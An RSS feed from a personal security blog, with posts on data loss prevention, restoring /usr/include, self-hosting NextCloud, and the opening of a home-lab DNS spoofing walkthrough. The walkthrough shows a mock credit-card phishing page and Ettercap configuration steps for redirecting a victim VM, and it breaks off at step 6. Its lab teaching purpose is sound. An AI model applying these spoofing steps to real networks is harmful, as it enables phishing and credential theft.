&lt;li&gt;&lt;a href=&#34;https://www.ubuntupit.com/linux-boot-process-explained-step-by-step-for-beginners/&#34;&gt;Linux Boot Process Explained&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Preboot_Execution_Environment&#34;&gt;Preboot Execution Environment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://unix.stackexchange.com/questions/414799/efi-variable-entries-in-sys-firmware-efi-efivars&#34;&gt;EFI Variables- Stack Exchange&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://uefi.org/sites/default/files/resources/UEFI_Spec_2_9_2021_03_18.pdf&#34;&gt;UEFI Specification Version 2.9 (March 2021)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://wiki.debian.org/initramfs&#34;&gt;Initramfs Debian Wiki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>How to Prevent Data Leaks Before they Happen</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-04-23_how-to-prevent-data-leaks-before-they-happen-3c53997b3744/</link>
      <pubDate>Sun, 23 Apr 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-04-23_how-to-prevent-data-leaks-before-they-happen-3c53997b3744/</guid>
      <description>&lt;p&gt;Data Loss Prevention&lt;/p&gt;
&lt;h1 id=&#34;what-is-data-loss-prevention&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*65eSMdR110wv_HGg&#34; alt=&#34;&#34;  /&gt;

What is Data Loss Prevention?&lt;/h1&gt;
&lt;p&gt;Data Loss Prevention (DLP) is a strategy for preventing data exfiltration and destruction. Examples of data include financial information, customer data, trade secrets, and other confidential information that could harm a company or its customers if exposed.&lt;/p&gt;
&lt;p&gt;Common causes of data loss include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Human error&lt;/strong&gt;- accidental deletion of sensitive files, misconfiguring security settings, or being the victim of a social engineering attack.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Insider threats&lt;/strong&gt;- unauthorized saving and distribution of sensitive files by those with access to corporate systems.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Malware&lt;/strong&gt;- programs that infect a system and steal or corrupt data.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Physical damage&lt;/strong&gt;- natural disasters, hardware failures, and power outages can all result in the loss of data.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Theft or loss of devices&lt;/strong&gt;- data on the device at the time of being stolen/lost may be compromised.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;steps-of-data-loss-prevention&#34;&gt;Steps of Data Loss Prevention&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*3VYpuFQz25D0HYRxMrEyMg.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://cdn.sketchbubble.com/pub/media/catalog/product/optimized1/7/f/7f3f224484e9abfed723832a1fee08a73cdf27c9b5eb2b177a645fcc3c2c7261/data-loss-prevention-slide2.png&#34;&gt;https://cdn.sketchbubble.com/pub/media/catalog/product/optimized1/7/f/7f3f224484e9abfed723832a1fee08a73cdf27c9b5eb2b177a645fcc3c2c7261/data-loss-prevention-slide2.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Data Classification&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Data classification falls under the broad umbrella of data governance. This is essentially the process of determining which data is considered to be sensitive so that it can be protected. It is an important prerequisite step to a successful DLP program.&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Data Mapping&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;This is the process of determining how data is transferred, where data is stored, how it is processed, and who has access to it. The goal of data mapping is to create a comprehensive inventory of an organization’s data assets.&lt;/p&gt;
&lt;p&gt;Data is often in one of two states: in transit or at rest. It is typical that an audit will be performed on all the systems and applications that contain data at rest including file servers, cloud storage, databases, email systems, and other data repositories. Once this has been completed, it is common to create a map illustrating the flow of data through an organization. This includes identifying how data is processed, transmitted, and stored, as well as who has access to it at each stage of the process. The information collected through data mapping can be used to develop DLP policies and controls to protect sensitive data.&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Protect Data&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Data protection involves implementing controls in order to maintain the confidentiality of the information classified in step 1. Common data protection methods include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Encryption&lt;/strong&gt;- the robustness and scope of encryption used will be determined by the assets that it is aiming to protect and how sensitive they are.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Access Control&lt;/strong&gt;- limiting user permissions, enforcing multi-factor authentication (MFA), and potentially monitoring user behavior to detect suspicious activity&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Security Policy&lt;/strong&gt;- social media policy, clear desk policy, acceptable use policy, and end user policy are all potential ways to enforce operational security.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Employee Training&lt;/strong&gt;- employees should be trained on data handling best practices, strong password policy, and identifying social engineering schemes. Regular awareness campaigns can reinforce the importance of data security.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;DLP Software Solutions&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*hwsT5tgv1e1AHF6S&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://innovative.land/wp-content/uploads/2020/08/Data-Loss-Prevention-DLP.jpg&#34;&gt;https://innovative.land/wp-content/uploads/2020/08/Data-Loss-Prevention-DLP.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Commercial tools can be used to prevent data loss the methods mentioned previously. DLP software can be found from cloud platforms and email providers as native implementations. Commercial solutions include Symantec CloudSOC CASB, Symantec DLP, McAfee Total Protection for DLP, and Digital Guardian to name a few.&lt;/p&gt;
&lt;p&gt;As explained by CloudFlare, DLP solutions may detect sensitive data through data fingerprinting, keyword matching in files, pattern matching, file matching, and exact data matching. By comparing the unique identifiers of sensitive data, the software is able to determine whether the sensitive data is being exfiltrated and enact measures to prevent it. For example, the DLP program may block suspicious outgoing emails.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Data loss prevention is an essential element of any organization’s cybersecurity strategy, as it helps protect sensitive data from loss or theft. By implementing a comprehensive DLP program, organizations can reduce the risk of data breaches and maintain the trust of their customers and stakeholders. However, it’s important to remember that DLP requires ongoing monitoring, evaluation, and improvement to ensure its effectiveness over time.&lt;/p&gt;
&lt;h1 id=&#34;more-reading&#34;&gt;More Reading&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/access-management/what-is-dlp/&#34;&gt;https://www.cloudflare.com/learning/access-management/what-is-dlp/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=TPU6VrBa0Fs&#34;&gt;https://www.youtube.com/watch?v=TPU6VrBa0Fs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Data_loss&#34;&gt;https://en.wikipedia.org/wiki/Data_loss&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.secureworld.io/industry-news/data-loss-prevention-next-gen-dlp&#34;&gt;https://www.secureworld.io/industry-news/data-loss-prevention-next-gen-dlp&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Restoring Files in /usr/include</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-04-13_restoring-files-in--usr-include-88622911c3ae/</link>
      <pubDate>Thu, 13 Apr 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-04-13_restoring-files-in--usr-include-88622911c3ae/</guid>
      <description>&lt;p&gt;Hi guys, I made a mistake. In my frustration trying to debug my C program, I inadvertently deleted all the files within my &lt;code&gt;/usr/include&lt;/code&gt; folder. I didn’t realize at the time that this was a very important folder! As explained &lt;a href=&#34;https://www.kernel.org/doc/Documentation/kbuild/headers_install.txt&#34;&gt;here&lt;/a&gt;, it stores the Linux kernel’s libc header files! Rookie mistake, but luckily for us, there’s ways to fix it.&lt;/p&gt;
&lt;p&gt;If your &lt;code&gt;/usr/include&lt;/code&gt; folder is also looking more empty than the shelves during COVID, I come bearing the solution.&lt;/p&gt;
&lt;h1 id=&#34;getting-kernelheaders&#34;&gt;Getting Kernel Headers&lt;/h1&gt;
&lt;p&gt;You’ll want to download the kernel install from here: &lt;a href=&#34;https://www.kernel.org/&#34;&gt;https://www.kernel.org/&lt;/a&gt;. Choose the one that matches your Linux kernel version as close as possible. I’ll be using 6.2.10. From there, we’ll decompress the file and copy the contents of the include folder to &lt;code&gt;/usr/include&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# download the linux kernel files form kernel.org  
wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.2.10.tar.xz  
tar -xf linux-6.2.10.tar.xz # decompress the tarball  
# copy the contents of the include folder into /usr/include/  
sudo cp -r ./linux-6.2.10.tar.xz/include/ /usr/include/
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;restoring-additional-missingfiles&#34;&gt;Restoring Additional Missing Files&lt;/h1&gt;
&lt;p&gt;If you find that while compiling something, you still get errors, try this:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;apt-file search /path/to/&amp;lt;MISSING\_HEADER&amp;gt;.h
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In my case, I was missing &lt;code&gt;string.h&lt;/code&gt;, so I used &lt;code&gt;apt-file search /usr/include/string.h&lt;/code&gt; to see that I was needing the &lt;code&gt;libc6-dev&lt;/code&gt; library.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*fAw86hUT7orMXK8ZVFfZHQ.png&#34; alt=&#34;&#34;  /&gt;

I had this installed previously, but since I deleted the files, I need to remove the installation completely and reinstall it.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt remove --purge libc6-dev  
sudo apt install libc6-dev
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I also had to do the same with &lt;code&gt;linux-libc-dev&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt remove --purge linux-libc-dev  
sudo apt install linux-libc-dev
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Continue on with this methodology until you’ve installed all your missing dependencies. With these two steps combined, you should be able to restore your &lt;code&gt;/usr/include&lt;/code&gt; file. This worked for me. Best of luck!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How to Create and Deploy Your Own Cloud Server with NextCloud</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-04-09_how-to-create-and-deploy-your-own-cloud-server-with-nextcloud-345e185d602a/</link>
      <pubDate>Sun, 09 Apr 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-04-09_how-to-create-and-deploy-your-own-cloud-server-with-nextcloud-345e185d602a/</guid>
      <description>&lt;h1 id=&#34;why-create-a-cloudserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*-WVjY5h4EpphjjX7&#34; alt=&#34;&#34;  /&gt;

Why Create a Cloud Server?&lt;/h1&gt;
&lt;p&gt;As many security-conscious people are aware, saving something in the cloud really means saving it on somebody else’s computer. When using cloud services, you don’t own the data that you upload, nor do you own the program that you’re using. Additionally, it is within the cloud service provider’s rights to delete your data or remove your access to it if they had technical issues, went bankrupt, or you missed a bill. Not all of them will do that, but there is no law protecting the customer from something like this happening. There aren’t any measures in place to prevent the government or corporations from looking through your data and using it for their own objectives (in the US).&lt;/p&gt;
&lt;p&gt;Aside from data security, creating your cloud server provides the opportunity to learn more about how cloud storage works, get practice with hosting a docker container and connecting to it on your LAN, and challenge yourself to do something new.&lt;/p&gt;
&lt;h1 id=&#34;why-nextcloud&#34;&gt;Why NextCloud&lt;/h1&gt;
&lt;p&gt;NextCloud is free and open source. They do not collect or share any of your data. For the paranoid, you can audit the &lt;a href=&#34;https://github.com/nextcloud&#34;&gt;source code&lt;/a&gt; yourself to verify this. The cost of a NextCloud server will be limited to the of the infrastructure that you’re using to host it.&lt;/p&gt;
&lt;h1 id=&#34;my-setup&#34;&gt;My Setup&lt;/h1&gt;
&lt;p&gt;In this demonstration, I’ll be hosting the NextCloud server in a Kali Linux virtual machine. Although I’m using Kali, you can do this on any operating system that allows you to download Docker. I’ll be accessing it through other devices on my LAN.&lt;/p&gt;
&lt;h1 id=&#34;creating-your-docker-container&#34;&gt;Creating Your Docker Container&lt;/h1&gt;
&lt;p&gt;To start, if you don’t already have docker installed, you can find the release for your operating system here: &lt;a href=&#34;https://docs.docker.com/desktop/release-notes/&#34;&gt;https://docs.docker.com/desktop/release-notes/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;pull-and-run-the-nextcloud-container&#34;&gt;Pull and run the NextCloud container&lt;/h2&gt;
&lt;p&gt;To find the versions of NextCloud that are available to you, visit their docker website: &lt;a href=&#34;https://hub.docker.com/_/nextcloud&#34;&gt;https://hub.docker.com/_/nextcloud&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yVUBpaz7cPnubERvyi-o7w.png&#34; alt=&#34;&#34;  /&gt;

In this example, I’ll be using version 24.0.11, but you can substitute with whichever version you’re using.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo docker pull nextcloud:24.0.11
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The output of that command will look like this once it is completed:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*GN-cYnfs54AiOogx8-NAQw.png&#34; alt=&#34;&#34;  /&gt;

Next, I’ll start the container and bind it to port 80 on my Kali VM.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo docker run --name my\_cloud -d -p 80:80 nextcloud:24.0.11 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Explanation:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--name&lt;/code&gt; will set the container name to be &lt;code&gt;my_cloud&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; will run the container in detached mode. This means that the container will run in the background of my terminal instead of displaying all the output&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; allows for port-binding from port 80 of the docker container to port 80 of the machine that the container is running on so that we can access it in the browser&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now, visiting &lt;code&gt;&amp;lt;http://localhost:80&amp;gt;&lt;/code&gt; in the browser of my Kali VM leads to the NextCloud web interface.&lt;/p&gt;
&lt;h1 id=&#34;setting-up-nextcloud-foruse&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*09ClzbW6QlZFUKeE8VCFqw.png&#34; alt=&#34;&#34;  /&gt;

Setting up NextCloud for use&lt;/h1&gt;
&lt;h2 id=&#34;create-adminaccount&#34;&gt;Create Admin Account&lt;/h2&gt;
&lt;p&gt;Like the initial homepage says, you can create an admin account by entering your desired credentials into the login form. Then click the install button below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*NCg8BFzJsn7Q8DSYJc22gw.png&#34; alt=&#34;&#34;  /&gt;

You will be prompted with a screen that optionally allows you to install reccomended apps.&lt;/p&gt;
&lt;h2 id=&#34;create-useraccount&#34;&gt;Create User Account&lt;/h2&gt;
&lt;p&gt;Each user of NextCloud will only be able to view their respective files. To create a user account, click on your profile picture and click &lt;code&gt;Users&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*rpUr6mASFndr9leQFgxjSw.png&#34; alt=&#34;&#34;  /&gt;

Then, click the &lt;code&gt;New user&lt;/code&gt; button in the upper-righthand corner.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*XZ6nK22WFx20KFCEcIweNg.png&#34; alt=&#34;&#34;  /&gt;

Fill in the form that appears with your desired information. and click &lt;code&gt;Add a new user&lt;/code&gt;. You can verify that the user was added by logging out of your administrator account and logging in with the user credentials.&lt;/p&gt;
&lt;h2 id=&#34;whitelisting-domains&#34;&gt;Whitelisting Domains&lt;/h2&gt;
&lt;p&gt;Now, we’ll need to configure the NextCloud server so that we can access it from other devices.&lt;/p&gt;
&lt;p&gt;You’ll need to know your IP address. I use the &lt;code&gt;ifconfig&lt;/code&gt; command on my Kali VM to determine. Windows users can use &lt;code&gt;ipconfig&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*EPZQQ90fBx0es5jESHsJQg.png&#34; alt=&#34;&#34;  /&gt;

I’ll install vim as a text editor so that I can edit the config files easier.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~]  
└─$ sudo docker exec -it my\_cloud bash   
root@f6d476ccd902:/var/www/html# apt update  
-- snip --  
root@f6d476ccd902:/var/www/html# apt install -y vim  
-- snip --  
root@f6d476ccd902:/var/www/html# vim config/config.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In your &lt;code&gt;config/config.php&lt;/code&gt; file, add the option of &lt;code&gt;trusted_domains&lt;/code&gt; at the bottom, starting on line 21 (type &lt;code&gt;:set number&lt;/code&gt; in vim to show line numbers). This option will allow you to connect to the NextCloud server through different domain names. Without this option, you would not be able to use your server through a domain name besides localhost, which is not ideal if you’re trying to access it remotely.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; &amp;#39;trusted\_domains&amp;#39; =&amp;gt;  
 [  
 &amp;#39;localhost&amp;#39;,  
 &amp;#39;127.0.0.1&amp;#39;,  
 &amp;#39;&amp;lt;YOUR IP ADDRESS&amp;gt;&amp;#39;,  
 &amp;#39;&amp;lt;YOUR DOMAIN NAME (optional)&amp;gt;&amp;#39;,  
 ],
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*RFzQIvqVYLkE7HLgJ2eciA.png&#34; alt=&#34;&#34;  /&gt;

Now, I can use my NextCloud server from 192.168.1.53, 127.0.0.1, and localhost.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You can optionally choose to configure your own database. The documentation for doing that can be found &lt;a href=&#34;https://docs.nextcloud.com/server/latest/admin_manual/configuration_database/linux_database_configuration.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&#34;connecting-from-otherdevices&#34;&gt;Connecting From Other Devices&lt;/h1&gt;
&lt;h2 id=&#34;pc&#34;&gt;PC&lt;/h2&gt;
&lt;p&gt;To connect from you PC, just type in the IP address of your NextCloud server into your browser and type in your login credentials.&lt;/p&gt;
&lt;h2 id=&#34;mobile&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*YSMzF6AAy_s1ddUyTn1fRA.png&#34; alt=&#34;&#34;  /&gt;

Mobile&lt;/h2&gt;
&lt;p&gt;You can also connect to the website from your phone. Alternatively, you can download the NextCloud app, available in the &lt;a href=&#34;https://apps.apple.com/us/app/nextcloud/id1125420102&#34;&gt;App Store&lt;/a&gt; and &lt;a href=&#34;https://apps.apple.com/us/app/nextcloud/id1125420102&#34;&gt;Google Play Store&lt;/a&gt;. Just type the same URL into the app that you would type in the browser.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*rXIb7WPys_Tqgbh_&#34; alt=&#34;&#34;  /&gt;

Conclusion&lt;/h1&gt;
&lt;p&gt;NextCloud allows for a tremendous amount of flexibility. There are many configurations that you can set including brute force protection, antivirus scanning, OAuth2, and more as shown in &lt;a href=&#34;https://docs.nextcloud.com/server/latest/admin_manual/configuration_server/index.html&#34;&gt;their documentation&lt;/a&gt;. I hope that you got value out of this article and were inspired to take control of your data.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Practical Demonstration: DNS Spoofing &#43; Home Lab</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-03-28_practical-demonstration--dns-spoofing---home-lab-f7294443fb23/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-03-28_practical-demonstration--dns-spoofing---home-lab-f7294443fb23/</guid>
      <description>&lt;h2 id=&#34;dns-cache-poisoning-on-home-lab-walkthrough&#34;&gt;DNS Cache Poisoning on Home Lab Walkthrough&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*P3ZahJWqz8AFbk9s.png&#34; alt=&#34;Basic DNS cache poisoning attack&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png&#34;&gt;https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;In this article, I will be walking you through a common method of implementing DNS cache poisoning on a network. I’ll illustrate my process with screenshots, commands, and explanations. You are welcome to follow along and gain hands-on experience with DNS spoofing to further reinforce the knowledge that you already have.&lt;/p&gt;
&lt;h2 id=&#34;intended-audience&#34;&gt;Intended Audience&lt;/h2&gt;
&lt;p&gt;This is intended for a more technical audience. If you’re a beginner, I recommend looking for a more comprehensive tutorial to walk you through all the terminology and commands. For the purposes of this article, I’m assuming that you already have a foundational understanding of Linux, DNS, virtual machines, and potentially troubleshooting. I will not be explaining how DNS cache poisoning works. For more information, you may read the articles linked in the “More Reading” section at the end of this post.&lt;/p&gt;
&lt;h2 id=&#34;tools-used&#34;&gt;Tools Used&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Windows VM&lt;/li&gt;
&lt;li&gt;Kali VM&lt;/li&gt;
&lt;li&gt;Ettercap&lt;/li&gt;
&lt;li&gt;Text editor&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You will also need root/system privileges or sudo abilities on the attacking machine.&lt;/p&gt;
&lt;h1 id=&#34;practical-demonstration&#34;&gt;Practical Demonstration&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Find the IP address of your attacker machine&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Since I’m doing this on my LAN, I can use my private IPv4 address, which I truncated from the &lt;code&gt;ifconfig&lt;/code&gt; command for the purpose of this demonstration.&lt;/p&gt;
&lt;h2 id=&#34;2-create-the-landing-page-of-your-malicious-website&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*UY_WaZN3PluXBghyE4c0nA.png&#34; alt=&#34;&#34;  /&gt;

2. Create the landing page of your malicious website&lt;/h2&gt;
&lt;p&gt;Now, we’ll prepare the HTML file that the victim will encounter once the DNS has been spoofed. Since I’m using an Apache webserver, I’ll place the file in the root directory on my machine, which is &lt;code&gt;/var/www/html&lt;/code&gt;. This is my file:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(ally㉿kali)-[/var/www/html]  
└─$ cat index.html   
&amp;lt;title&amp;gt;No More Planting Trees&amp;lt;/title&amp;gt;  
  
&amp;lt;h1&amp;gt;No More Planting Trees&amp;lt;/h1&amp;gt;  
  
&amp;lt;h3&amp;gt;YouR CaR&amp;#39;s ExteNDeD WarraNTy is AlMosT OuT&amp;lt;/h3&amp;gt;  
&amp;lt;p&amp;gt;Give me all your PII NOW or else your identity will be stolen !!! !!&amp;lt;/p&amp;gt;  
&amp;lt;form&amp;gt;  
  
 &amp;lt;label for=&amp;#34;cc&amp;#34;&amp;gt;Enter YouR CreDIT CarD Number ASAP &amp;lt;b&amp;gt;ASAP&amp;lt;/b&amp;gt; !!:&amp;lt;/label&amp;gt;  
 &amp;lt;input id=&amp;#34;cc&amp;#34; placeholder=&amp;#34;or else&amp;#34; /&amp;gt;  
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I then changed the ownership of the file to the service account &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo chown www-data ./index.html
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Start Malicious Web Server&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;As stated previously, I’m using Apache, so I just started the&lt;code&gt;apache2&lt;/code&gt; service.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8yqslDbjbDYLIde9DLp0Jw.png&#34; alt=&#34;&#34;  /&gt;

When I visit &lt;code&gt;[http://127.0.0.1/index.html](http://127.0.0.1/index.html,)&lt;/code&gt;, I see my malicious webpage.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*c0hPCdzDnLLWE_0zuWDwtw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;No one would actually enter their credit card number here… right??&lt;/em&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Verify Website is Reachable from Victim Computer&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;This is pretty simple. I just visit my Kali IPv4 address in the browser of Windy Runner (my VM) to verify that it can be loaded from the Windows machine.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Bov2hAJHJNLDGy6L-T8Idg.png&#34; alt=&#34;&#34;  /&gt;

As we can see here, I am able to access the webpage. Now we can get to the fun stuff.&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Configuring Ettercap&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Quick Theory&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Ettercap is being used in this context to resolve DNS queries coming from the victim machine. Ettercap will respond to the DNS query with the IP address of the attacking machine (Kali) such that when the victim visits the target domain, they will be redirected to the attacker&amp;rsquo;s IP address instead of the real IP address associated with the domain name.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Editing etter.conf&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Open up your text editor of choice.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo vim etter.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The changes to make are shown in green in the screenshot below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*OC5xz4T3RuZNKlKHAjLlNg.png&#34; alt=&#34;&#34;  /&gt;

&lt;strong&gt;Explanation:&lt;/strong&gt; I set the UID and GID to 0 so that Ettercap has adequate permissions on the machine. In this case, UID and GID 0 are root permissions. I then uncommented lines 179, 180, 183, and 184. The purpose of the &lt;code&gt;redir_commands&lt;/code&gt; is explained best in the &lt;a href=&#34;https://linux.die.net/man/5/etter.conf&#34;&gt;etter.conf man page&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[P]rovide[s] a valid command (or script) to enable tcp redirection at kernel level in order to be able to use SSL dissection.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Editing etter.dns&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Assuming you&amp;rsquo;re using the default configuration file for &lt;code&gt;etter.dns&lt;/code&gt;, all you need to do is skip to the bottom of the file and add the domain name you intend to spoof, the associated A and PTR records, and your attacking IP address.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo vim /etc/ettercap/etter.dns
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;6-get-the-ip-address-of-the-victimmachine&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*KcKAb7OJbz_0f5CoNtpJow.png&#34; alt=&#34;&#34;  /&gt;

6. Get the IP Address of the Victim Machine&lt;/h2&gt;
